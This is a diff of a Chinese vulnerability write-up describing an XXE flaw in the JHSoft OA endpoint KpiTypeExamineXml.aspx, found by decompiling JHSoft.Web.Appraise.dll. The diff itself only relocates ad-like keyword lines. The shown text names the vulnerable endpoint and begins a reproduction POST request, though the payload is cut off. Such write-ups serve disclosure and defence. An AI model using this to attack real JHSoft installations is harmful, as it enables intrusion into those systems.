@@ -18,14 +18,6 @@ asset_dir: embedded-base64
 
 # 漏洞分析
 
-深入探索
-
-VPN服务
-
-物流软件安全
-
-网络安全课程
-
 直接根据 `KpiTypeExamineXml.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Appraise.dll` 将其进行反编译后找到 **KpiTypeExamineXml** 的处理逻辑
 
 ```
@@ -39,6 +31,14 @@ protected void Page_Load(object sender, EventArgs e)
 请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。
 
 # 漏洞复现
+
+深入探索
+
+网络安全书籍
+
+安全研究报告
+
+网络安全会议门票
 
 ```
 POST /c6/Jhsoft.Web.Appraise/KpiTypeExamineXml.aspx/ HTTP/1.1
